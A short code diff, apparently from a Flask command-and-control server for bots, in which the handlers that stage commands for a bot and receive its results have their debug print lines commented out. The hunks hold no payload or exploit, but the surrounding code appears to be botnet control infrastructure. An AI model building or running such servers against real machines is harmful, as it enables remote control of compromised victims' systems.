@@ -275,7 +275,7 @@ def botpush(target):
             db.session.add(cmd)
             db.session.commit()
 
-            print("[DEBUG] Command staged")
+            #print("[DEBUG] Command staged")
 
             return jsonify({'result': 'Command staged'})
 
@@ -359,7 +359,7 @@ def botresult(bot_id):
         if 'registerkey' in data:
             if data['registerkey'] == REGISTERKEY:
                 result = data['result']
-                print("[DEBUG] result = ", result)
+                #print("[DEBUG] result = ", result)
 
                 query_bot = Bot.query.filter_by(id=bot_id).first()
                 command = Command.query.filter_by(bot_id=query_bot.id).order_by(Command.id.desc()).first()
